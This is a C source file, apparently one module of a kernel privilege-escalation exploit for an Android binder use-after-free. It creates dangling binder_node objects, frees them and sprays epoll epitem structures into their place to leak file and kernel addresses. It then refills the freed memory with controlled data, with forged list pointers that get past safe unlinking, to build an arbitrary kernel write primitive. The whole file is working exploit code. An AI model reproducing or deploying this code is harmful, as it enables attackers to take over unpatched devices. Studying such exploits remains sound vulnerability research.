#include <errno.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/epoll.h>

#include "binder.h"
#include "binder_lookup.h"
#include "log.h"
#include "exploit.h"
#include "endpoint.h"
#include "node.h"

/*
 * Create a vulnerable dangling node within the binder transaction.
 */
static struct exp_node *_node_new(struct exp_node *node, const char *name)
{
	struct binder_state *bs = NULL;
	pthread_t *uaf_node_th = NULL;
	//uint32_t num_pending = 0x40;
	uint32_t num_pending = 0x40;
   uint64_t vma_start = 0;
	uint64_t handle = 0;

   if (!node || !name)
      return NULL;

	bs = binder_open(BINDER_DEVICE, 128 * 1024);
	if (!bs) {
		return NULL;
	}

	handle = grab_handle(bs, name);
	if (!handle)
		return NULL;

	/* Prepare the pending nodes array. */
	uaf_node_th = calloc(num_pending + 1, sizeof(pthread_t));
   if (!uaf_node_th) {
      log_err("[-] Unable to allocate new pending node thread array. Reason: '%s'\n", strerror(errno));
      goto err;
   }

	vma_start = setup_pending_nodes(bs, handle, uaf_node_th, num_pending, 0);
   if (!vma_start) {
      log_err("[-] Bug trigger failed.\n");
      goto err;
   }

   /* Initialize exp_node. */
   node->bs = bs;
   node->vma_start = vma_start;
   memset(node->name, 0, sizeof(node->name));
   strncpy(node->name, name, sizeof(node->name) - 1);
   node->handle = handle;
   node->th = uaf_node_th;
   node->idx = 0;
   node->num_pending = num_pending;
   node->max = num_pending;
   node->second = false;
   node->target_fd = -1;
   node->ep_fd = -1;

   return node;

err:
   if (uaf_node_th)
      free(uaf_node_th);

   return NULL;
}

/*
 * Create a new `exp_node`.
 */
struct exp_node *node_new(const char *name)
{
   struct exp_node *node = NULL;

   node = calloc(1, sizeof(*node));
   if (!node) {
      log_err("[-] Unable to allocate new node. Reason: '%s'\n", strerror(errno));
      return NULL;
   }

   /* Need to bootstrap the associated endpoint. */
   bootstrap_endpoint(name);

   if (!_node_new(node, name)) {
      free(node);
      return NULL;
   }

   return node;
}

/*
 * Free all pending node threads.
 */
void node_free_pending_nodes(struct exp_node *node)
{
   int i;

	/* Terminate all pending nodes. */
	for (i = 0; i < node->num_pending; i++) {
		pending_node_terminate(node->bs, node->handle, node->th[i]);
	}

}

/*
 * Free an exp_node, and the associated binder endpoint and pending
 * transactions as well. The only way to safely remove a dangling
 * `binder_node` from the `binder_proc` is to close the associated
 * file descriptor.
 */
static void _node_free(struct exp_node *node, bool reset)
{

	int i;
	int n = node->num_pending;

	/* Terminate all pending nodes. */
	for (i = 0; i < n; i++) {
		pending_node_terminate(node->bs, node->handle, node->th[i]);
	}

	/* Close binder. */
	binder_close(node->bs);
   
   /* Close the remaining epitem if exists. */
   if (node[0].ep_fd != -1)
      close(node[0].ep_fd);

	/* Reset the associated endpoint. */
   if (reset) {
      //endpoint_reset(node->name);
      terminate_endpoint(node->name);
      bootstrap_endpoint(node->name);
   } else {
      terminate_endpoint(node->name);
      /* Free the memory associated with the node. */
      free(node->th);
      free(node);
   }
}

/*
 * Free an `exp_node` and terminate the associated
 * endpoint.
 */
void node_free(struct exp_node *node)
{
   _node_free(node, false);
}

/*
 * Reset an `exp_node` by restarting the remote endpoint.
 */
bool node_reset(struct exp_node *node)
{
   uint8_t name[16];

   memset(name, 0, sizeof(name));
   strncpy(name, node->name, sizeof(name)-1);
   _node_free(node, true);

   /* Reinit node. */
   if (_node_new(node, name))
      return true;

   return false;
}

/*
 * Use the vulnerable to decrement the refcount of the underlying `binder_node` and have it eventually
 * be `kfree()`ed.
 */
void node_kfree(struct exp_node *node)
{
   if (!node)
      return;

   pending_node_free(node->bs, node->handle, node->vma_start, node->num_pending + 1, 1, node->second);
}



#define NEPITEMS  0x20

/*
 * This function is used to disclose a `file` structure from a given file descriptor.
 * It relies on the fact that we can leak data at offset 0x58 and 0x60 a `binder_node`, which
 * exactly overlap with linked list pointer of epitem structure pointing to the 'file' we
 * gave in parameter to `EPOLLCTL_ADD`
 */
static bool _disclose_file_addr(struct exp_node *node, int *ep_arr, int n)
{
   uint64_t file_addr = 0;
   uint64_t origA, origB, A, B;
   int idx = -1;
   int i;

   if (!node || !ep_arr)
      return 0;

   /* leak the original value. */
   node_leak(node, &origA, &origB);

   if (origA == 0 || origB == 0 || origB == 0xdead000000000200)
      return 0;

   /* Close the epitems by starting by the end of the array. */
   i = n - 1;
   bool found = false;
   while (i >= 0) {
      /* Close 1 epitem. */
      close(ep_arr[i]);
      ep_arr[i] = -1;

      /* Leak the result to see if something changed. */
      node_leak(node, &A, &B);
      if (!found && (A != origA || B != origB)) {
         if (B == 0xdead000000000200) {
            return false;
         }
         idx = i - 1;
         i--;
         found = true;
      }
      i--;
   }

   /* Leak our values, we should have something interesting. */
   node_leak(node, &A, &B);

   node->file_addr = A - 0xd8;
   node->ep_fd = ep_arr[idx];

   return true;
}

/*
 * Free a `binder_node` and reallocates an `epitem` structure
 * in its place.
 */
bool node_realloc_epitem(struct exp_node *node, int fd)
{
   bool res = false;
   struct epoll_event evt;
   uint64_t file_addr = 0;
   int ep_arr[NEPITEMS + 1];
   int i, j, k, n;

   if (!node)
      return false;

   /* Prepare epoll structure. */
   bzero(&evt, sizeof(evt));
   evt.events = EPOLLIN;

  for (i = 0; i < NEPITEMS; i++)
      ep_arr[i] = -1;

  evt.data.fd = fd;
  epoll_ctl(ep_arr[0], EPOLL_CTL_ADD, fd, &evt);

   /* Allocate the epitems. */
  for (i = 0; i < NEPITEMS; i++) {
     int ep = epoll_create1(0);
      if (ep < 0) {
         log_err("epoll_create1: '%s'\n", strerror(errno));
         goto cleanup;
      }

      ep_arr[i] = ep;
  }

   /* Free the `binder_node`. */
   node_kfree(node);

   /* Try to reallocate with `struct epitem`. */
   for (i = 1; i < NEPITEMS; i++) {
      evt.data.fd = fd;
      epoll_ctl(ep_arr[i], EPOLL_CTL_ADD, fd, &evt);
   }

   if (!_disclose_file_addr(node, ep_arr, NEPITEMS))
      goto cleanup;

   node->target_fd = fd;

   return true;

cleanup:
      for (i = 0; i < NEPITEMS; i++) {
         if (ep_arr[i] != -1)
            close(ep_arr[i]);
      }

   return res;
}


/*
 * Disclose the kernel address of a `binder_node` by relying on 2 `binder_node`
 * whose content has been replaced by `epitem` structure.
 * We close the sprayed `epitem` structure, until we are sure about which epitem has
 * replace the content of our `binder_node`. By controlling 2 epitem which points back to each
 * other, we can disclose the content of both `binder_node` by reading the `prev` and `next` field
 * of the `epitem` structure, which in this case point to each other.
 */
bool node_kaddr_disclose(struct exp_node *node1, struct exp_node *node2)
{

   uint64_t a0;
   uint64_t b0;
   uint64_t b1;
   uint64_t a1;

   if (!node1->file_addr || node1->target_fd == -1 || node2->target_fd != -1)
      return false;

   /* The node needs to be single. */
   node_leak(node1, &a0, &b0);
   if (a0 != b0)
      return false;

   while (!node_realloc_epitem(node2, node1->target_fd))
      node_reset(node2);

   /* Looks good, let's disclose the respective kaddrs. */
   node_leak(node1, &a0, &b0);
   node_leak(node2, &a1, &b1);

   if (a0 == b1) {
      node1->kaddr = a1 - 0x58;
      node2->kaddr = b0 - 0x58;
   } else if (b0 == a1) {
      node2->kaddr = a0 - 0x58;
      node1->kaddr = b1 - 0x58;
   } else {
      return false;
   }

   return true;
}


/*
 * Free an epitem structure, by closing the file descriptor.
 * The only trouble here is the fact that it's freed using
 * `call_rcu()` which introduced indetermism when trying to replace
 * the freed content.
 */
bool node_free_epitem(struct exp_node *node)
{
   if (!node || node->ep_fd == -1)
      return false;

   close(node->ep_fd);
   node->ep_fd = -1;
   /* Allow the CPU to enter quiescent state and free the `epitem`. */
   usleep(10000); 

   return true;
}


/*
 * This function is a little bit complicated (slow?), as it needs to replace a
 * `binder_node` with an epitem first, to disclose its kernel address, and then replace it
 * with controlled content using the `sendmsg()` threads to do so. The only trouble being
 * that the `epitem` structure is freed using `call_rcu()` which introduces indetermism. Therefore
 * it gets tricky to reliably reallocate the content of the `binder_node`.
 */
bool node_realloc_content(struct exp_node *node, void *data, size_t size)
{
   bool res = false;
   uint64_t origA, A, B;

   if (!node)
      return false;


   setup_realloc_buffer(data, size);

   origA = *(uint64_t *)(data + 0x58);


   /* Decide which course of action to take. */

   
   /* Do we have an overlay with an epitem? */
   if (node->ep_fd != -1) {
      // Easy, just free the epitem. 
      close(node->ep_fd);
      usleep(10000);
      node->ep_fd = -1;
   } else if (node->tid) {
      //DO we really want to do that?
      log_info("node->tid!!!!\n");
      reset_realloc_threads();
      return false;
   } else {
      /* It hasn't been freed, so just kfree it. */
      node_kfree(node);
   }

   /* Let the threads spray kmalloc() with controlled content. */
   realloc_barrier_wait();
   /* Wait a little bit.*/

   /* Leak new node value and hope for the best. */
   node_leak(node, &A, &B);

   /* Double check to see if the node content was realloc properly. */
   if (A == origA) {
      res = true;

      if (discard_realloc_thread(B))
         node->tid = B;
   }

   reset_realloc_threads();

   return res;
}


/*
 * Trigger a write8 and overwrite and arbitrary location with a controlled value.
 * As above, we need to go through the cycle of replacing a `binder_node` with an epitem
 * and then with controlled content from the `sendmsg()`  threads.
 */
bool node_write8(struct exp_node *node, uint64_t what, uint64_t where)
{
   struct exp_node *dummy = NULL;
   int pfd[2];
   uint8_t data[0x80];

   if (!node)
      return false;

   if (node->idx == node->num_pending)
      return false;

   memset(data, 0, 0x80);

   *(uint64_t *)(data + 0x20) = what;
   *(uint64_t *)(data + 0x28) = where;
   *(uint64_t *)(data + 0x30) = 0; 
   *(uint64_t *)(data + 0x38) = 0; /* proc == NULL */
   *(uint64_t *)(data + 0x40) = 0; /* No refs. */
   *(uint32_t *)(data + 0x48) = 0; /* Internal strong refs. */
   *(uint32_t *)(data + 0x4c) = 0; /* local_weak_refs  == 0.  */
   *(uint32_t *)(data + 0x50) = 1; /* local strong refs. */
   *(uint32_t *)(data + 0x54) = 0; /* tmp_refs == 0. */
   *(uint64_t *)(data + 0x58) = 0x4444444444444444; /* Used by node_realloc_content to verify replacement */
   *(uint64_t *)(data + 0x68) = 0; /* has_strong_refs == 0 &&  has_weak_refs == 0 */

   /* Create dummy node. */
   dummy = node_new("dummy");
   pipe(pfd);

   /* Overlay an epitem. */
   while (!node_realloc_epitem(dummy, pfd[0]))
         node_reset(dummy);


   /* Do we know the node kaddr yet? */
   if (!node->kaddr) {
      /* Drop the current epitem. */
      node_free_epitem(node);


      /* Use the previous'dummy' node to disclose both
       * dummy and node kaddr.
       */
      node_kaddr_disclose(dummy, node);
   }

   /* update the kaddr values to bypass safe unlinking. */
   *(uint64_t *)(data + 0x8) = node->kaddr + 0x8;
   *(uint64_t *)(data + 0x10) = node->kaddr + 0x8;

   log_info("[*] Reallocating content of '%s' with controlled data.", node->name);
   while (!node_realloc_content(node, data, 0x80)) {
      log_info(".");
      node_reset(node);
      while (!node_kaddr_disclose(dummy, node)) {
         node_reset(node);
      }

      /* Update values. */
      *(uint64_t *)(data + 0x8) = node->kaddr + 0x8;
      *(uint64_t *)(data + 0x10) = node->kaddr + 0x8;
   }

   if (dummy) {
      node_free(dummy);
      close(pfd[0]);
      close(pfd[1]);
   }
   log_info("[DONE]\n");

   /* Perform the actual write8, all the code before was for setup... */
   log_info("[+] Overwriting 0x%llx with 0x%llx...", where, what);
   pending_node_write8(node->th[node->idx - 1]);
   log_info("[DONE]\n");

   return true;
}


/*
 * Trigger a write8 primitive and overwrite an arbitrary location with a NULL value.
 * Assumes the binder node associated with `node` has just been freed, and its kernel
 * address has been previously disclosed.
 */
bool node_write_null(struct exp_node *node, uint64_t where)
{
   return node_write8(node, 0, where);
}


bool node_leak(struct exp_node *node, uint64_t *A, uint64_t *B)
{
   if (!node || node->idx == node->num_pending)
      return false;

   pending_node_leak(node->th[node->idx++], A, B);

   return true;
}

